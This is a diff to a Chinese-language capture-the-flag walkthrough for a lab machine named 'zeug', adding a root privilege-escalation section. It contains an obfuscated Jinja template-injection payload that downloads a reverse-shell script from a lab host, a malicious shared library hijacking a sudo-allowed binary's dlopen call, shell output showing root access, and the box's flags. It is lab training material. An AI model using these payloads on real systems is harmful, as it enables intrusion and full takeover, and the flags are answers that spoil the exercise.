@@ -834,17 +834,7 @@ class DebuggedApplication:
 
 </details>
 
-### 计算 PIN code
-
-```plaintext title=""
-# /etc/machine-id
-# {{lipsum.__globals__.__builtins__.open("/etc/machine-id").readline().strip()}}
-48329e233f524ec291cce7479927890b
-# /proc/sys/kernel/random/boot_id
-# {{lipsum.__globals__.__builtins__.open("/proc/sys/kernel/random/boot_id").readline().strip()}}
-7fc0efd5-5586-43eb-bef5-72b7b0a675b1
-
-```
+### 直接利用 popen 构建命令执行反弹 shell
 
 ```plaintext title=""
 {{lipsum.__globals__.__builtins__.eval("__impo"+"rt__(\"o"+"s\").po"+"pen(\"wget 192.168.56.102/reverse.sh -o /home/co"+"sette/reverse.sh\").read()")}}
@@ -930,8 +920,59 @@ exia
 ### flag - user
 
 ```plaintext
-exia@zeug:~$ cat user.txt 
+exia@zeug:~$ cat user.txt
 HMYVM{exia_1XZ2GUy6gwSRwXwFUKEkZC6cT}
 ```
 
-TODO root 提权部分还没写
+### 动态库执行代码注入
+
+```plaintext title="sudo -l"
+Matching Defaults entries for exia on zeug:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User exia may run the following commands on zeug:
+    (root) NOPASSWD: /usr/bin/zeug
+```
+
+反编译 zeug 程序，得到
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+    if (dlopen("/home/exia/exia.so", 2) )
+    return 0;
+    fwrite("Error opening file\n", 1uLL, 0x13uLL, _bss_start);
+    return 1;
+}
+```
+
+可以猜测是要借助 dlopen 加载依赖库实现代码注入
+
+```c title="exia.c"
+#include <stdio.h>
+#include <stdlib.h>
+
+__attribute__((constructor))
+void init()
+{
+    puts("Hello dynamic linkage world!");
+    system("/bin/bash");
+}
+```
+
+```shell title="Exploit it"
+(remote) exia@zeug:/home/exia$ gcc -shared -fPIC -o exia.so exia.c
+(remote) exia@zeug:/home/exia$ sudo -u root /usr/bin/zeug
+Hello dynamic linkage world!
+root@zeug:/home/exia# whoami
+root
+```
+
+## User - root
+
+### flag - root
+
+```shell
+root@zeug:~# cat root.txt 
+HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
+```
